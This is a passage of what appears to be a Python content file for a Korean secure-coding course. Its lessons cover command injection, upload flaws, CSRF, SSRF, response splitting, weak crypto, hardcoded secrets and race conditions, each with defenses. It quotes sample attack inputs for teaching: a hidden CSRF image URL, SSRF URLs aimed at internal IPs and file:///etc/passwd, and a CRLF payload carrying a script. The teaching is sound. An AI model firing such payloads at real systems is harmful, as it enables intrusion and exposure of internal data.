                    <p>Django는 기본적으로 HTML escaping을 적용해 XSS를 줄여 준다. 하지만 <code>mark_safe()</code>는 “이 문자열은 안전하다”고 프레임워크에 알려 주는 함수이므로, 사용자 입력이 섞인 HTML에 사용하면 Django의 XSS 방어 정책을 우회하게 된다. 온라인에서 가져온 코드에 <code>mark_safe</code>가 있다면, 정말 신뢰할 수 있는 고정 HTML에만 쓰였는지 반드시 확인해야 한다.</p>
                    """,
                },
                {
                    "heading": "Command Injection",
                    "body": f"""
                    <p>Command Injection은 사용자 입력이 운영체제 명령으로 실행되는 취약점이다. Python의 <code>os.system()</code>처럼 시스템 명령을 실행하는 API에 외부 입력을 그대로 넣으면, 공격자는 서버에서 임의 명령을 실행할 수 있다.</p>
                    {sc04_command_vulnerable}
                    <p>취약 코드는 POST의 <code>app_name</code> 값을 그대로 <code>os.system()</code>에 전달한다.</p>
                    {command_injection_vulnerable}
                    <p>개발자는 메모장이나 계산기처럼 특정 프로그램 실행만 의도했을 수 있다. 그러나 입력값을 제한하지 않으면 공격자는 <code>ls</code>, <code>dir</code>, <code>set</code> 같은 정보 조회 명령부터 파일 삭제, 다운로드, 권한 변경 명령까지 서버 권한으로 실행하려고 할 수 있다.</p>
                    {sc04_command_safe}
                    <p>방어 코드는 허용할 프로그램 목록을 화이트리스트로 둔다.</p>
                    {command_injection_safe}
                    <p><code>ALLOW_PROGRAM</code>에 포함된 값만 실행하고, 그 외 입력은 에러 처리한다. 핵심은 “입력값을 명령으로 해석하지 않게 만드는 것”이다. 가능하면 시스템 셸을 호출하지 않는 안전한 API를 사용하고, 꼭 실행해야 한다면 허용 목록과 고정 인자만 사용해야 한다.</p>
                    """,
                },
                {
                    "heading": "파일 업로드 취약점",
                    "body": f"""
                    <p>파일 업로드 취약점은 사용자가 올리는 파일의 종류, 크기, 개수, 이름, 확장자를 검증하지 않아 악성 파일이 서버에 저장될 때 발생한다. 게시판 첨부파일이나 이미지 업로드 기능은 흔하지만, 제한 없이 저장하면 웹셸이나 스크립트 파일이 올라가 서버 공격으로 이어질 수 있다.</p>
                    {sc04_upload_vulnerable}
                    <p>취약 코드는 업로드 파일이 존재하면 바로 <code>FileSystemStorage</code>에 저장한다.</p>
                    {file_upload_vulnerable}
                    <p>이 코드는 파일 개수, 파일 크기, 콘텐츠 타입, 확장자를 확인하지 않는다. 공격자는 실행 가능한 파일이나 매우 큰 파일, 의도하지 않은 형식의 파일을 업로드할 수 있다. 업로드 위치가 웹에서 실행 가능한 경로라면 위험은 더 커진다.</p>
                    {sc04_upload_safe}
                    <p>방어 코드는 파일 개수, 크기, 콘텐츠 타입, 확장자를 모두 제한한다.</p>
                    {upload_validation}
                    <p>예시에서는 최대 파일 개수를 5개로 제한하고, 최대 크기를 5MB로 제한하며, <code>image/jpeg</code> 타입과 <code>.jpg</code>, <code>.jpeg</code> 확장자만 허용한다. 강의의 핵심은 업로드 기능에서 “파일이 올라왔는가”만 확인하면 안 된다는 점이다. 어떤 파일을 얼마나, 어떤 타입으로, 어느 위치에 저장할지 모두 제한해야 한다.</p>
                    """,
                },
            ],
            "checks": [
                "입력 데이터 검증이 다른 시큐어 코딩 분류보다 큰 비중을 갖는 이유를 설명할 수 있는가?",
                "SQL Injection을 막기 위해 파라미터 바인딩을 사용해야 하는 이유를 이해했는가?",
                "eval()과 os.system()에 사용자 입력을 넣는 것이 왜 위험한지 말할 수 있는가?",
                "Path Traversal에서 확장자 검사만으로 충분하지 않은 이유를 설명할 수 있는가?",
                "XSS와 파일 업로드 취약점에서 프레임워크 보안 기능과 파일 제한이 어떤 역할을 하는지 이해했는가?",
            ],
        },
        {
            "id": "1-5",
            "title": "입력 데이터 검증 2부",
            "subtitle": "CSRF, SSRF, HTTP Response Splitting, Integer Overflow, Format String Injection을 이어서 정리한다.",
            "tags": ["CSRF", "SSRF", "입력 검증"],
            "objectives": [
                "CSRF가 사용자의 브라우저로 원치 않는 요청을 보내게 만드는 문제임을 이해한다.",
                "SSRF가 서버로 하여금 공격자가 원하는 내부·외부 요청을 보내게 만드는 문제임을 설명한다.",
                "HTTP Response Splitting에서 개행 문자가 헤더를 쪼개는 원리를 이해한다.",
                "정수 범위와 포맷 문자열도 입력 검증 대상임을 설명한다.",
                "프레임워크 보안 기능을 끄는 코드와 데코레이터를 주의해야 함을 기억한다.",
            ],
            "sections": [
                {
                    "heading": "CSRF",
                    "body": f"""
                    <p>5강은 4강에서 다룬 SQL Injection, Code Injection, Path Traversal, XSS, Command Injection, File Upload에 이어 입력 데이터 검증 및 표현 범주의 나머지 취약점을 정리한다. 첫 번째 주제는 <strong>CSRF(Cross-Site Request Forgery)</strong>다. CSRF는 공격자가 사용자의 브라우저로 하여금 사용자가 의도하지 않은 요청을 보내게 만드는 취약점이다.</p>
                    {sc05_csrf_flow}
                    <p>강의에서는 게시글의 이미지 태그를 예로 들었다. 일반적으로 게시글에 이미지를 올리면 이미지 파일 자체가 게시글 안에 직접 들어가는 것이 아니라 웹 서버에 저장되고, 게시글에는 이미지 경로가 들어간다. 사용자가 게시글을 열면 브라우저는 게시글 안의 <code>img src</code> 경로를 보고 그 주소로 자동 요청을 보낸다.</p>
                    <p>공격자는 이 동작을 악용해 이미지 경로 자리에 악의적인 URL을 넣을 수 있다. 슬라이드의 예시는 <code>&lt;img src="http://www.victim.com/board/notice/write/?name=관리자&amp;email=admin@victim.com&amp;title=긴급공지&amp;contents=보안사고 발생..." width=0 height=0&gt;</code>처럼 보이지 않는 이미지 태그에 게시글 작성 요청을 숨긴다. 다른 사용자가 해당 게시글을 열면 그 사용자의 브라우저가 자동으로 요청을 보내고, 서버는 그 사용자의 로그인 세션과 권한으로 요청을 처리할 수 있다.</p>
                    {sc05_csrf_disabled}
                    <p>Django는 CSRF가 워낙 대표적인 웹 취약점이기 때문에 기본 방어 기능을 제공한다. 하지만 <code>settings.py</code>의 <code>MIDDLEWARE</code> 목록에서 <code>CsrfViewMiddleware</code>를 삭제하거나 주석 처리하면 전역적으로 CSRF 유효성 검사가 제거된다. 또한 특정 view 함수에 <code>csrf_exempt</code> 데코레이터를 붙이면 해당 함수는 CSRF 검사를 건너뛴다.</p>
                    {csrf_disabled_example}
                    <p>강사는 직접 개발할 때 이런 방어 해제 기능을 일부러 쓰지 않더라도, GitHub에서 내려받은 코드나 예제 프로젝트에는 이미 이런 설정이 들어 있을 수 있다고 강조했다. 따라서 외부 코드를 가져와 사용할 때는 CSRF 미들웨어가 활성화되어 있는지, 결제·포인트 지급·글 작성처럼 상태를 변경하는 함수에 <code>csrf_exempt</code>가 붙어 있지 않은지 반드시 확인해야 한다.</p>
                    """,
                },
                {
                    "heading": "SSRF",
                    "body": f"""
                    <p><strong>SSRF(Server-Side Request Forgery)</strong>는 공격자가 서버로 하여금 공격자가 원하는 요청을 보내게 만드는 취약점이다. 공격자는 어떤 URL에 직접 접근할 수 없지만, 웹 서버는 내부망이나 신뢰된 리소스에 접근할 권한을 갖고 있을 수 있다. 이때 사용자가 입력한 URL을 서버가 대신 요청해 주는 기능이 있으면, 공격자는 조작된 요청을 통해 서버가 내부 서버에 접근하게 만들 수 있다.</p>
                    {sc05_ssrf_flow}
                    <p>공격 흐름은 네 단계로 정리된다. 공격자가 조작한 요청을 웹 서버에 보내고, 웹 서버는 그 요청을 처리하면서 내부 서버로 전달한다. 내부 서버의 응답이 다시 웹 서버로 돌아오면, 웹 서버는 의도하지 않은 내부 리소스를 공격자에게 노출할 수 있다. 일반적인 상황에서는 공격자가 신뢰된 내부 자원에 직접 접근할 수 없지만, 서버가 대신 요청하면 접근 경계가 우회된다.</p>
                    {sc05_ssrf_examples}
                    <p>슬라이드는 SSRF 삽입 코드의 여러 예를 보여 준다. 내부망 중요 정보 획득은 <code>http://sample_site.com/connect?url=http://192.168.0.45/member/list.json</code>처럼 사설 IP의 JSON 파일을 서버가 대신 요청하게 하는 방식이다. 외부 접근이 차단된 관리자 페이지도 <code>http://192.168.0.45/admin</code>으로 요청하게 만들 수 있다. 도메인 체크가 허술하면 <code>sample_site.com:x@192.168.0.45</code>처럼 사용자 정보 구문을 섞어 우회할 수 있고, 단축 URL을 이용해 필터를 우회하거나 <code>file:///etc/passwd</code> 같은 파일 URL로 서버 내부 파일 열람을 시도할 수도 있다.</p>
                    {sc05_ssrf_safe}
                    <p>방어의 핵심은 사용자가 입력한 주소를 그대로 신뢰하지 않는 것이다. 강의의 방어 코드는 접근 가능한 내부 자원을 화이트리스트로 정하고, 입력 주소가 그 목록에 없으면 에러 페이지를 반환한다. 슬라이드에는 도메인 이름만 화이트리스트로 두면 DNS rebinding 공격 등에 노출될 수 있으므로 신뢰할 수 있는 자원에 대한 IP를 기준으로 검증하는 편이 더 안전하다는 주석도 포함되어 있다.</p>
                    {ssrf_allowlist}
                    <p>정리하면 SSRF 방어는 “서버가 대신 요청해 주는 기능”을 설계할 때부터 제한해야 한다. 사용자가 준 URL을 바로 <code>requests.get()</code>에 넣는 구조를 피하고, 허용된 목적지·프로토콜·포트만 통과시키며, 내부망·로컬호스트·파일 스킴 같은 위험한 목적지는 기본적으로 차단해야 한다.</p>
                    """,
                },
                {
                    "heading": "HTTP Response Splitting",
                    "body": f"""
                    <p><strong>HTTP Response Splitting</strong>은 브라우저가 웹 서버에 HTTP 요청을 보내고 응답을 받는 과정에서, 응답 헤더에 들어가는 값에 악의적인 개행 문자를 삽입해 서버가 의도하지 않은 응답을 만들게 하는 취약점이다. HTTP 응답은 헤더와 본문을 줄 단위로 구분하므로, 외부 입력값 안에 헤더 구분자가 들어가면 하나의 값이 여러 헤더나 본문처럼 해석될 수 있다.</p>
                    {sc05_response_flow}
                    <p>슬라이드의 첫 예시는 <code>ref=http://xxx.com/%0d%0aContent-Type:+text/html;%0d%0a%0d%0aTEST&lt;script&gt;alert('XSS');&lt;/script&gt;</code>처럼 요청 파라미터 안에 <code>%0d</code>, <code>%0a</code>를 넣는다. 강사는 이 값들이 HTTP 프로토콜에서 헤더를 구분하는 문자로 쓰일 수 있기 때문에, 서버가 원래는 하나의 헤더 값으로 처리해야 할 내용을 새로운 헤더나 새로운 콘텐츠로 오해할 수 있다고 설명했다.</p>
                    {sc05_response_example}
                    <p>두 번째 예시는 <code>user_id</code> 값에 <code>%0D%0A</code>와 <code>(New Header)</code>를 넣는 경우다. 정상이라면 응답에는 <code>User_id: Dongdd</code> 같은 하나의 헤더만 들어가야 하지만, 개행 구분자가 들어가면 응답 쪽에서 <code>(New Header)</code>가 별도 헤더처럼 삽입될 수 있다. 공격자는 이를 이용해 사용자가 받는 응답에 서버가 의도하지 않은 헤더나 데이터를 넣으려 한다.</p>
                    {sc05_response_safe}
                    <p>방어는 비교적 명확하다. 응답 헤더에 외부 입력값을 넣어야 한다면, 먼저 개행 문자를 제거하거나 허용된 문자만 통과시켜야 한다. 슬라이드의 방어 코드는 <code>Content-Type</code>에 들어갈 외부 입력값에서 <code>\\r</code>과 <code>\\n</code>을 제거한 뒤 헤더로 설정한다.</p>
                    {http_response_splitting_safe}
                    <p>중요한 점은 사용자 입력이 HTML 콘텐츠에 들어갈 때만 검증 대상이 되는 것이 아니라는 점이다. 응답 헤더, 리다이렉션 주소, 쿠키 값처럼 프로토콜 구조를 만드는 위치에 들어가는 값도 입력 검증 대상이다. 프로토콜 구분 문자를 그대로 통과시키면 애플리케이션 로직이 아니라 HTTP 메시지 구조 자체가 변조될 수 있다.</p>
                    """,
                },
                {
                    "heading": "Integer Overflow",
                    "body": f"""
                    <p><strong>Integer Overflow</strong>는 원래 허용된 정수 범위를 넘어서는 입력값이 들어왔을 때 발생하는 문제다. 강의에서는 Python의 NumPy 패키지를 예로 들었다. NumPy는 행렬과 수치 계산에서 많이 쓰이며, 데이터 타입을 <code>int64</code>로 지정하면 64비트 정수 범위 안의 값만 안정적으로 처리할 수 있다.</p>
                    {sc05_integer_vulnerable}
                    <p>취약 예시는 <code>np.power(number, pow, dtype=np.int64)</code>를 그대로 호출한다. 사용자가 64비트 범위를 넘는 숫자와 지수를 입력하면, NumPy 연산 과정에서 오버플로우가 발생하고 결과가 비정상적으로 변하거나 프로그램 오류로 이어질 수 있다. 강사는 오버플로우뿐 아니라 표현 가능한 범위보다 더 작은 값이 들어오는 언더플로우도 같은 관점에서 주의해야 한다고 설명했다.</p>
                    {integer_overflow_vulnerable}
                    {sc05_integer_safe}
                    <p>방어 예시는 <code>np.iinfo(np.int64).max</code>와 <code>np.iinfo(np.int64).min</code>으로 <code>int64</code>의 최댓값과 최솟값을 구한 뒤, NumPy 함수에 넘기기 전에 계산 결과가 범위를 벗어나는지 검사한다. 범위를 넘으면 함수 안으로 진입시키지 않고 <code>-1</code> 같은 비정상 종료 값을 반환한다.</p>
                    {integer_overflow_safe}
                    <p>이 강의에서 강조하는 입력 검증의 의미는 “문자열에 위험한 특수문자가 있는지 검사하는 것”에만 머물지 않는다. 숫자도 입력값이며, 숫자형 라이브러리나 시스템 함수가 처리할 수 있는 범위가 정해져 있다면 그 범위를 넘는 값은 실행 전에 차단하거나 업무 규칙에 맞게 최대·최소값으로 제한해야 한다.</p>
                    """,
                },
                {
                    "heading": "Format String Injection",
                    "body": f"""
                    <p><strong>Format String Injection</strong>은 웹 서버가 문자열을 처리할 때, 사용자 입력을 단순 값이 아니라 포맷 문자열 구조로 해석하면서 생기는 취약점이다. Python의 <code>format()</code> 문자열이나 f-string은 중괄호 안의 표현식을 해석해 객체의 속성이나 값을 꺼낼 수 있다. 공격자가 포맷 문자열 자체를 제어하면 서버가 원래 보여 주면 안 되는 내부 값을 메시지에 포함시킬 수 있다.</p>
                    {sc05_format_vulnerable}
                    <p>슬라이드의 취약 코드는 <code>AUTHENTICATE_KEY = 'Password'</code>라는 내부 값을 가진 상태에서, <code>msg_format</code>을 사용자 입력으로 받아 <code>format_string.format(user=user_info)</code>를 실행한다. 강사는 이 두 입력값이 모두 사용자의 조작을 받을 수 있으면, 공격자가 포맷 문자열을 설계해 <code>user_info</code> 안의 민감한 값이나 서버 코드의 키, 세션 관련 값을 메시지로 노출시킬 수 있다고 설명했다.</p>
                    {format_string_vulnerable}
                    {sc05_format_safe}
                    <p>방어 방법은 포맷 문자열 자체를 사용자에게 맡기지 않는 것이다. 안전한 예시는 개발자가 코드 안에서 <code>'user name is {{}}'</code>라는 고정 포맷을 정하고, 사용자 이름 같은 필요한 데이터만 값으로 넣는다. 그러면 사용자는 포맷 구조를 바꿀 수 없고, 서버 내부 객체를 임의로 탐색할 수도 없다.</p>
                    {format_string_safe}
                    <p>강의 마지막에서 강사는 Python 3.6 이후 f-string도 같은 관점에서 조심해야 한다고 덧붙였다. f-string 자체를 사용하지 말라는 뜻이 아니라, 외부 입력이 포맷 구조나 평가될 표현식으로 쓰이면 안 된다는 뜻이다. 사용자의 입력은 개발자가 정한 출력 틀 안에 들어가는 데이터로만 처리해야 한다.</p>
                    """,
                },
            ],
            "checks": [
                "CSRF에서 이미지 경로나 외부 요청이 어떻게 악용될 수 있는지 설명할 수 있는가?",
                "Django의 CSRF 미들웨어와 csrf_exempt 사용을 왜 점검해야 하는지 이해했는가?",
                "SSRF가 서버의 내부 접근 권한을 악용하는 방식임을 설명할 수 있는가?",
                "HTTP Response Splitting에서 개행 문자 제거가 필요한 이유를 말할 수 있는가?",
                "정수 범위와 포맷 문자열도 사용자 입력 검증 대상으로 봐야 하는 이유를 이해했는가?",
            ],
        },
        {
            "id": "1-6",
            "title": "보안 기능과 시간 및 상태",
            "subtitle": "암호 알고리즘 선택, 하드코딩 방지, 안전한 난수, 쿠키 유효기간, 무결성 검증, 인증 제한, 레이스 컨디션, 무한 루프를 정리한다.",
            "tags": ["보안 기능", "Race Condition", "난수"],
            "objectives": [
                "암호화 알고리즘은 목적과 표준에 맞는 안전한 알고리즘을 선택해야 함을 이해한다.",
                "아이디, 비밀번호, 경로, 키 값을 코드에 하드코딩하면 안 되는 이유를 설명한다.",
                "보안용 난수는 일반 random이 아니라 secrets나 OS 난수를 사용해야 함을 이해한다.",
                "쿠키 유효기간, 무결성 검증, 반복 인증 시도 제한의 목적을 설명한다.",
                "레이스 컨디션과 무한 루프·재귀 호출 문제를 시간 및 상태 관점에서 정리한다.",
            ],
            "sections": [
                {
                    "heading": "적절한 암호 알고리즘 사용",
                    "body": f"""
                    <p>6강부터는 입력 데이터 검증이 아니라 <strong>보안 기능</strong>과 <strong>시간 및 상태</strong>를 다룬다. 보안 기능은 암호화 알고리즘, 반복된 인증 시도 제한처럼 널리 알려진 보안 기능을 올바르게 사용하는 방법이고, 시간 및 상태는 멀티스레딩·멀티프로세스 환경이나 반복 함수에서 시간 차이와 상태 변화 때문에 생기는 문제를 방지하는 방법이다.</p>
                    {sc06_outline}
                    <p>보안 기능의 대표 예는 암호화 알고리즘이다. 서버와 서버 사이, 서버와 클라이언트 사이에서 데이터가 평문으로 전송되지 않도록 암호화를 사용하지만, 암호화를 했다는 사실만으로 안전해지는 것은 아니다. 오래된 알고리즘이나 권장되지 않는 모드를 쓰면 암호문을 받은 사람이 알고리즘을 분석해 복호화하거나 평문을 알아낼 수 있다.</p>
                    {sc06_crypto_standard}
                    <p>강사는 목적에 맞는 공개 표준을 따라야 한다고 설명했다. 대칭키 암호에는 AES 계열처럼 현재 안전하다고 평가되는 알고리즘을 사용해야 하고, 공개키 암호, 전자서명, 해시, 메시지 인증, 난수발생기, 키 설정·키 유도 알고리즘도 각각 권장 알고리즘과 키 길이가 존재한다. 이런 기준에서 벗어난 알고리즘을 쓰면 암호화했음에도 통신 과정의 암호문이 복호화될 위험이 있다.</p>
                    {sc06_des_code}
                    <p>슬라이드의 코드 예시는 DES를 사용한다. DES는 개발된 지 오래되었고, 당시와 비교해 현재 컴퓨팅 파워가 훨씬 커졌기 때문에 더 이상 안전한 선택으로 보기 어렵다. 특히 ECB 모드는 같은 평문 블록이 같은 암호문 블록으로 나타나는 구조적 문제가 있어 민감 데이터 보호에 부적절하다.</p>
                    {des_weak_algorithm}
                    <p>따라서 “암호화 함수가 호출된다”는 사실만 확인해서는 부족하다. 코드 리뷰에서는 어떤 알고리즘을 쓰는지, 키 길이와 운용 모드가 적절한지, 표준에서 권장하는 설정인지까지 확인해야 한다.</p>
                    """,
                },
                {
                    "heading": "하드코딩 방지",
                    "body": f"""
                    <p><strong>하드코딩</strong>은 개발 편의를 위해 호스트, 포트, 사용자 아이디, 비밀번호, 경로, 키처럼 환경에 따라 바뀌어야 하는 값을 코드 안에 고정 문자열로 넣는 것이다. 강사는 이런 값을 코드에 직접 넣으면 공격자가 소스 코드나 저장소에 접근했을 때 중요 데이터까지 함께 읽을 수 있다고 설명했다.</p>
                    {sc06_hardcoding_flow}
                    <p>흐름도에서는 하드코딩된 암호가 들어 있는 소프트웨어가 공격자에게 노출되고, 공격자가 그 값으로 제한 없는 접근을 하거나 원하는 정보를 추출하는 과정을 보여 준다. 실제로 개발자가 하드코딩된 코드를 GitHub에 올리면, 코드를 내려받은 사람이 아이디와 비밀번호를 그대로 확인할 수 있다.</p>
                    {sc06_hardcoding_bad}
                    <p>취약 코드는 DB 접속 정보인 <code>host</code>, <code>port</code>, <code>user</code>, <code>passwd</code>, <code>db</code>를 모두 소스 코드에 평문으로 넣는다. 이 파일 하나만 유출되어도 DB 계정과 비밀번호가 노출된다.</p>
                    {hardcoded_secret}
                    {sc06_hardcoding_safe}
                    <p>방어 예시는 설정 파일에서 값을 읽고, 암호화되어 저장된 사용자명과 비밀번호를 복호화해 사용한다. 중요한 값은 코드에서 분리하고, 설정 파일 자체도 암호화하거나 접근 권한을 제한해야 한다. 복호화 키도 코드에 평문으로 넣지 않고 별도 보관해야 한다.</p>
                    {security_config}
                    <p>핵심은 코드가 노출되어도 비밀값이 함께 노출되지 않게 만드는 것이다. 설정값, 비밀번호, API 키, 암호화 키는 코드와 분리해 관리하고, 저장소에 올릴 때는 실사용 비밀값이 포함되지 않았는지 점검해야 한다.</p>
                    """,
                },
                {
                    "heading": "안전하지 않은 난수 생성기",
                    "body": f"""
                    <p>Python의 <code>random</code>이나 C의 <code>rand()</code>는 개발 과정에서 자주 쓰이지만, 보안 기능을 위한 난수로는 적합하지 않다. 이 값은 진짜 난수가 아니라 유사 난수이며, 시드 값이나 난수 발생 알고리즘을 알면 공격자가 같은 난수열을 재현할 수 있다.</p>
                    {sc06_random_flow}
                    <p>강의의 공격 흐름은 공격자가 난수 발생기를 분석하고, 예측된 난수를 통해 난수 발생기를 우회한 뒤, 원하는 데이터 열람이나 권한 획득으로 이어지는 구조다. 난수가 암호화 키, OTP, 세션 토큰, 인증 우회 방지 값에 쓰였다면 예측 가능성은 곧 보안 기능 우회로 이어진다.</p>
                    {sc06_random_code}
                    <p>슬라이드의 위쪽 코드는 <code>random.randrange(10)</code>으로 6자리 OTP를 만든다. 강사는 일반 <code>random</code>이 특정 시간 기반 시드를 사용할 수 있으므로, 코드 실행 시간을 추정할 수 있으면 공격자가 가능한 난수를 좁혀 갈 수 있다고 설명했다. 아래쪽 코드는 <code>secrets.randbelow(10)</code>을 사용한다. 보안 기능에 필요한 난수는 <code>secrets</code> 패키지나 OS가 제공하는 <code>os.urandom()</code> 기반 난수를 사용해야 한다.</p>
                    {random_otp_example}
                    """,
                },
                {
                    "heading": "쿠키 유효기간과 무결성 검증",
                    "body": f"""
                    <p>쿠키는 사용자의 브라우저나 PC에 저장된다. 따라서 사용자의 PC가 감염되면 쿠키 값이 공격자에게 전송될 수 있다는 점을 항상 염두에 두어야 한다. 쿠키 유효기간이 지나치게 길면, 유출된 쿠키를 공격자가 오랫동안 사용해 해당 사용자처럼 웹사이트에 접속할 수 있다.</p>
                    {sc06_cookie_flow}
                    <p>흐름도는 공격자가 악성 코드를 유포하고, 악성 코드가 저장된 웹 서버를 통해 사용자 PC가 감염된 뒤, 쿠키 파일에 저장된 주요 정보가 유출되는 과정을 보여 준다. 쿠키는 유출될 수 있다는 전제에서 다뤄야 하며, 유효기간을 짧게 두어 유출 이후 악용 가능한 시간을 줄이는 것이 중요하다.</p>
                    {sc06_cookie_code}
                    <p>슬라이드의 취약 코드는 <code>rememberme</code> 쿠키의 <code>max_age</code>를 1년으로 설정한다. 방어 코드는 유효기간을 1시간으로 줄이고, HTTPS에서만 전송되도록 <code>secure=True</code>, JavaScript 접근을 막기 위해 <code>httponly=True</code>를 설정한다.</p>
                    {cookie_expiry_example}
                    <p>무결성 검증은 다운로드한 파일이나 서버에서 받은 데이터가 중간에 변조되지 않았는지 확인하는 과정이다. 공식 사이트가 제공하는 해시값과 내가 받은 파일의 해시값을 비교하면 파일이 손상되거나 조작되었는지 확인할 수 있다.</p>
                    {sc06_integrity_code}
                    <p>강의 예시는 신뢰할 수 없는 사이트에서 <code>code.py</code>를 다운로드해 <code>save.py</code>로 저장하는 코드다. 이 파일이 공식 파일인지, 누군가가 중간에서 조작한 파일인지 확인할 방법이 없기 때문에 그대로 실행하면 중간자 공격이나 조작 파일 실행으로 이어질 수 있다. 해시 검증이나 서명 검증 없이 원격 코드를 받아 실행하는 구조는 피해야 한다.</p>
                    {integrity_remote_download}
                    """,
                },
                {
                    "heading": "반복된 인증 시도 제한",
                    "body": f"""
                    <p>반복된 인증 시도 제한은 브루트포스 공격을 줄이기 위한 보안 기능이다. 공격자가 비밀번호를 계속 대입할 수 있고, 시간 제한이나 횟수 제한이 없다면 언젠가는 해당 계정의 비밀번호를 맞힐 가능성이 생긴다.</p>
                    {sc06_auth_limit}
                    <p>슬라이드는 공격자가 ID와 비밀번호 사전을 기반으로 1차, 2차, 3차, N차 시도를 계속 수행하는 모습을 보여 준다. 강사는 일정 횟수 이상 실패하면 IP를 차단하거나, 10분 동안 로그인 시도를 막거나, 추가 인증을 요구하는 식으로 시도를 제한해야 한다고 설명했다.</p>
                    <p>이 제한은 단순히 공격자를 불편하게 하는 기능이 아니다. 가능한 시도 횟수 자체를 줄여 공격 성공 확률을 낮추는 핵심 보안 기능이다. 로그인, 관리자 페이지, 비밀번호 재설정, OTP 검증 같은 인증 관련 기능에는 실패 횟수와 시간 제한을 반드시 고려해야 한다.</p>
                    """,
                },
                {
                    "heading": "Race Condition",
                    "body": f"""
                    <p>시간 및 상태 문제의 대표 예는 <strong>Race Condition</strong>이다. 강의에서는 TOCTOU, 즉 Time Of Check와 Time Of Use의 차이를 중심으로 설명했다. 멀티스레딩이나 멀티프로세스 환경에서 검사 시점과 실제 사용 시점 사이에 공유 자원의 상태가 바뀌면 프로그램이 의도하지 않은 동작을 할 수 있다.</p>
                    {sc06_race_flow}
                    <p>예를 들어 프로세스 A가 파일이 존재하는지 먼저 확인하고, 그 다음 파일을 읽으려 한다고 하자. 그런데 검사와 읽기 사이에 프로세스 B가 그 파일을 삭제하면, A는 “존재한다”고 판단한 파일을 읽는 순간 오류를 만난다. 동일한 파일에 두 스레드가 동시에 쓰는 경우도 문제가 된다. 두 스레드가 각각 빈 파일을 열고 내용을 쓴 뒤 저장하면, 기대한 두 내용이 모두 남지 않고 마지막에 저장한 내용만 남을 수 있다.</p>
                    {sc06_race_bad}
                    <p>취약 코드는 파일 존재 여부를 확인한 뒤 바로 파일을 열어 쓴다. 하지만 그 사이 다른 스레드나 프로세스가 파일을 바꾸거나 삭제할 수 있다.</p>
                    {race_condition_vulnerable}
                    {sc06_race_safe}
                    <p>방어 코드는 <code>threading.Lock()</code>을 사용한다. <code>with lock:</code> 구간 안에서는 한 번에 하나의 스레드만 공유 파일에 접근할 수 있으므로, 검사와 사용 사이의 상태 충돌을 줄일 수 있다. 강사는 lock 외에도 semaphore 같은 동기화 기법을 언급하며, 여러 스레드나 프로세스가 동일 공유 자원에 접근할 때는 한 작업을 먼저 끝낸 뒤 다음 작업을 처리하도록 만들어야 한다고 설명했다.</p>
                    {race_condition_lock}
                    """,
                },
                {
                    "heading": "무한 루프와 재귀 호출",
                    "body": f"""
                    <p>반복문이나 재귀 함수에서 종료 조건이 없으면 프로그램이 끝나지 않는다. 파일을 열거나 메모리를 계속 사용하는 코드라면 자원 고갈로 이어질 수 있고, CPU를 계속 점유해 다른 프로세스가 제대로 동작하지 못하게 만들 수 있다.</p>
                    {sc06_recursive_flow}
                    <p>강사는 <code>while</code> 같은 반복문에 종료 조건이 없거나, 함수가 계속 자기 자신을 호출하면 코드가 끝나지 않는다고 설명했다. 이런 코드는 메모리와 CPU를 계속 사용하므로 서버 전체 성능 저하나 서비스 장애로 이어질 수 있다.</p>
                    {sc06_recursive_code}
                    <p>factorial 예시에서 위쪽 코드는 <code>return num * factorial(num - 1)</code>만 있고 탈출 조건이 없다. 따라서 <code>factorial(5)</code>를 호출해도 5, 4, 3, 2, 1, 0, -1로 계속 내려가며 종료되지 않는다. 아래쪽 코드처럼 <code>if num == 0: return 1</code>이라는 기저 조건을 두어야 재귀 호출이 끝난다.</p>
                    {recursive_loop_example}
                    <p>Python은 <code>sys.setrecursionlimit()</code>으로 재귀 호출 최대 횟수를 설정할 수 있다. 이것은 근본 해결책이라기보다는 피해를 제한하는 장치다. 실제 방어의 핵심은 반복문에는 조건 변화나 <code>break</code>를 두고, 재귀 함수에는 더 이상 자기 자신을 호출하지 않는 명확한 종료 조건을 두는 것이다.</p>
                    """,
                },
            ],
            "checks": [
                "DES 같은 오래된 알고리즘을 사용하면 암호화해도 안전하지 않을 수 있는 이유를 설명할 수 있는가?",
                "비밀번호와 키를 코드에 하드코딩하면 어떤 위험이 생기는지 이해했는가?",
                "random과 secrets의 보안상 차이를 말할 수 있는가?",
                "쿠키 유효기간을 너무 길게 두면 왜 위험한지 설명할 수 있는가?",
                "Race Condition을 검사 시점과 사용 시점의 차이로 설명할 수 있는가?",
                "무한 루프와 재귀 호출에 종료 조건이 필요한 이유를 이해했는가?",
            ],
        },
        {
            "id": "1-7",
            "title": "에러 처리, 코드 오류, API 오용",
            "transcript_title": "에러 처리 코드 오류 API 오용",
            "subtitle": "오류 메시지 노출, 부적절한 예외 처리, 널 참조, 역직렬화, DNS lookup, 취약 API·라이브러리 사용을 정리한다.",
            "tags": ["에러 처리", "역직렬화", "API 오용"],
            "objectives": [
                "오류 메시지가 공격자에게 내부 경로와 코드 정보를 줄 수 있음을 이해한다.",
                "예외 상황에서도 취약한 기본 키나 기본 동작으로 빠지지 않게 처리해야 함을 설명한다.",
                "널 값과 예상치 못한 값에 대한 검사가 코드 오류 방지에 중요함을 이해한다.",
                "신뢰할 수 없는 역직렬화 데이터와 pickle 사용의 위험을 설명한다.",
                "DNS lookup과 취약 API·라이브러리 사용이 보안 약점으로 이어지는 이유를 정리한다.",
            ],
            "sections": [
                {
                    "heading": "오류 메시지 노출",
                    "body": f"""
                    <p>7강은 시큐어 코딩 기법 중 마지막 묶음인 <strong>에러 처리, 코드 오류, API 오용</strong>을 다룬다. 첫 번째 주제는 오류 메시지 노출이다. 프로그램을 개발하고 운영하면 SQL 오류, URL 라우팅 오류, 서버 내부 예외처럼 다양한 문제가 발생한다. 문제 자체보다 더 위험한 것은 그 오류 메시지가 서버 관리자만 보는 로그에 남는 것이 아니라 일반 사용자 화면에 그대로 표시되는 상황이다.</p>
                    {sc07_error_flow}
                    <p>강의의 첫 화면은 SQL 오류 메시지가 외부에 노출되는 흐름을 보여 준다. 공격자가 로그인이나 게시판 기능에 비정상 입력을 보냈을 때, 서버가 “어떤 SQL문이 실패했는지”, “어떤 조건에서 오류가 났는지”를 사용자 화면에 그대로 보여 주면 공격자는 데이터베이스 구조와 쿼리 작성 방식을 추정할 수 있다. 이 정보는 단순한 오류 안내가 아니라 다음 공격을 설계하는 힌트가 된다.</p>
                    {sc07_django_default_error}
